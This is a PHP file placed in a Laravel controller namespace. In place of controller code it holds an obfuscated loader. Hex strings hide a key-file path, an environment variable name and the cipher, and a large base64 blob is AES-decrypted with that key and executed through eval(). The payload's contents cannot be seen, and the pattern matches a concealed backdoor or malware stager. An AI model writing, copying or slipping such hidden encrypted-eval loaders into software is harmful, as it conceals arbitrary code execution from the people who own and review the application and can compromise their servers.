<?php
namespace App\Http\Controllers\Sistem;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('b0RQJFK9VuWsq782j3SLlA==');

$c=base64_decode(

'N7zjKvsiThNXB/zWCDJwWZn7RhQTDioSh37Qh4eYagnzKIUAt0ZaFQ0ud3h+/vbrdIBx9xatqjF3' .
'lgMe0ggdii93tpdaE8DN1P0dzlo89SUA1cQIkkLJSEGwIIFchwouMxWIr2hAKlXTIqF1oz7qFbXZ' .
'lOZ5LFJG0xYSUIfm02Trf3h026KT4bOTdurgXoN7FfsJjAoac9s7MlFUqJfNn6CXikytcLQJH0cv' .
'vMyIA8f3ADzrfDKS9OiknBlpYrZdlMeFJwPJLv8A8xzpzpH3RN8Uhwfpsm3NuqryFWU/EunMioFh' .
'FwtJ8xFuJBZ2eT5PBQEGiqxi7yQ8qQ/JaD/nxdSIDTVA8WUqNXmbQC+kCFJKKzkBqYN1OmuihXeb' .
'hk/Qw0vIcwGc9vBQBPT10tR5RM5ZefZoX8yF4Mr8J2fCYAX3f/SGxxLV33ngimpN4Na9H9VCvftD' .
'6x1eopxz2k0vyl/GDww5pOJI+nqA0E0GLUWtSdCzeqOP0eil1JJMNbOr+HzxnzX2I/taeYJ14GPU' .
'Q7zDy2tBgxEiNuF+uxfbFoYGxUC7c4ZbKhKNb2oRwp+JthN+l7nyirE2MmNkJEo7KL659Ji2Gkju' .
'yKwSHatTGilXfNpZjFm2I6pHit6jB1oz5Y5KOqjGjuDV3hTBNeEWRtCOnE53KwUBcMdjCjO249Wq' .
'Wj9cNIkKZ1ea0IHOFJOaRQeGtSLPEvJA+uwPGgi3altoZfFqHCWr5Zn8AZ071x8NrvCIWedzsMNm' .
'sfvj4xrZqCuRDhMv56CGcXYeSqyQlT0hIYNQACJYqbgji6YLx/3eHmH8/oOOzzOaj8j63Ly+yprF' .
'Vvd8upcUU9tOh9sO0LjbVsmaaqGXDpcY0Ed/fNIRW447B3uKPEU4vX0y2YYtOw2SBsnFOW/qYKhC' .
'IQ9BtBThBbTaNblgwJwlPUN/Oe0VrowSCXsXqM6gf6enSCOeHpN36IPn0Rtlo/X1QjwevVRqxh16' .
'wFxntYjDQQ+LT+i/5TECaOZREi+JW4q2c7/lybbKexRSonSYijuoMbMWzLpNGK9WcoKSX94tKvO1' .
'YvMSvLPRknpKtCy0uUkwYgyitCeUq71V8ADym8XZ4RfL3RO1a2TiGwpd4pTSKpfUULXgM/K306HM' .
'BVrH9h5BLbZPmwZ2jG58f9xUm/aXaAcTs58DgvtYsSRe17T5H7KMz5iWGMthsK9rUx5gY1I3lyiz' .
'egB//qvbnB+zzh+t5LXtdfujmFAKamZBDN6YxpH2XOfUk/xLhyDpixDXeO3kdi8mtqMWLuGhrhCa' .
'FpWuyFQDAoB0yZMIPTORbl6L4JUbXqqLRhA4MsTHye/ZDmiifRI4rcYM+LgQOeTlTA1AdXtqZQye' .
'eUWjxZ6aeF3E+vgU4fWiWaO6l7ro4DsEQaFwcfKmqc/1CigdTWErKH2hL0Rqa06bhtVo/zbT7FPw' .
'qbGM9G1mH1LP19F+7P7bty21EhDtpGK1q6eGtnf2yBNLkwqG+5krSz/V/qXH25+xkXqXomO+0C6h' .
'ZIrRuywKaDadK177pjb6bSgwqCkP3pS9Jj96jEbs3ydEeVjxm/BUrAL8mfFuBz2hnRdeAMWU+C6o' .
'PvE7pDhE75T44CmnYpRB1hCiwkPVZSdGd0uUePr4jTjgPLWcDlRB9UnVOAY8wghOuMyAu2hRJ40m' .
'7Xm8YgBeq13E1+IcM/0HkW7e7ZUgajfus3YXh/EwPlmvJOw1B+3v9vixDu8YJMAsOC2Nn3iy2ccP' .
'pSHPWXrTVQW192a/f9COQJxL2KhYfWoMTmORKv4glEiXvSDN7o/Aeh7xZ91qlB6KHDDZEG1uJCLp' .
'J0RIXTryqjEfaewJheefuWWZLNbmA1QLipkJrM174r1AyqxFsAz49naeVg9gBbH5h90T8dS7P65Y' .
'YW1ld1Pj3qlXTopCWvZx11B/mfurAjd37SZ5ZJICLpyall+bAACHsQVfpnw7Amahhg+mMeJJHky2' .
'klEFKjTEGtD7fi6jFa+u6lAvDYkCS4YEiCXpemZr35WB+rnmwwzBUyx8Zk8X3oJSwnNg2CmEocDF' .
'M+Zf5xVIkMG475pg+pKLDWgdoa5nn01IzBliN/1PwAXZhRMcAhmYNA5nF/0LaVJcwTAHx3whdi+t' .
'T36GJbl+o77yvRAE/E7dElF915eC7ZBBil+dE2plUzZpJ/1h5yycOpKqad9BIjMLmZs9pVjG1Fg8' .
'om0t82YS+ZQeX2XX5QAr+bjRIaVJindmxbaL+lYBWStnMxRtOdZQ38QKCMAFkDznbMzkbbnkuUGQ' .
'wJQIsTwXBy96jL+oNdhPEqzu+za1BegAndx5ptOY50v7EzGlpi2oVEdptqHjaFzUwucK5iHmVNUA' .
'gq9Br2kw5dIO5I/HMdBHv2uZLI79yBoAAksQbqC2kj/9ul6zjJWSH+6eHgiSCceZdPTrJqB7Fb5v' .
'5bUcCRNmEIz2pYzanR+PrnQGYBg6Ba6XMiQhkscLYQGCWKFFMJYYhINmHHx/NkvT5IxfOzULj3Kb' .
'AGMVcEPtV0ftrW7GOaiQBcwFsn5Sny4rbQLWw1yHayJ2pimggdQLVWtuoPvEF5OIajNkto8kdsYW' .
'/IPeRsRv3lX8AYLqi7nJ6GBLHu7qCnHnMnj/J8ypUY8lMrjU7jQ9nmpR7GFPO6vdlylrahWIN5JC' .
'3647xtYtQ9JPBvracHuKBDhZysIw9mSuvtaxmPl1zxj6gz/LLBDb/QaBGxoQQ0vQvuAi6dZ/6t91' .
'g/w4cgQmRu7Fmd7SmqM5Nsq4DUQfg22DBnR3H94UKadiaMvu2KML060TfIzi9SH7epsPQQCVgDvp' .
'C3pWU1UfJMpeANrdiYq5/1lpsx/Hvp+ME9mXP1iLHRuU92MDXLx4VyOkTLFS8gq4OrREg8MQ2auI' .
's4LJFdxfqUqDjnWlCugftQ3J18Ehy8nZUUcYFu+RU32GuU0uU4bma7JinUL+ZaDFVAi8ncuDbhyF' .
'GntcC0C1tn7PglYB9j1KoaBhrGGD7e2VHw1ebPDNdMxCu+vvEKISgIVCmBx22bc1R5e8GKVj30we' .
'2TUT33NdhSHdpc625B1UXVeQV7sYYXo5Tk7lZ0fRX2Z5iSPKWgY+gzQ5LMaR56qzWfPho49k27lI' .
'OnZ/tBOy2jVQVKifahxouJPyx7AnCmWMF/xOKaufGTIRhXTIepGsFGt8Z5MwHxM0ZDMfuYf4l6rz' .
'BwSQylIS/AFKc3oZ1EVsxFJ9wokSO+Q3Fob0iGVbzz+JEIK4c9qyTPtYl3TRJf1jfjblrycrnbkO' .
'0E18oBBRdOPol7gbBsybjwmRYU9rlmyzJ/Crw3oCyu9ZStsXHfDPh17eCdEy3Q1EZGxzm3zs+mI0' .
'X5UPUjcfwN5qV/k777LSYXWMUPo85YA1qwal3b7qSZGTdZ0F1OFES6OS3t/b7sioAYlcnfaQzfXq' .
'vdukDOvsqERxen3LsC5M1RQDVYWBJ+ngckFmK6b2UOjoSHyEikaPdSqp84gB2tV346AxgCaqE8dU' .
'w0o9k0iIva4C0Zubyr1j388y'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

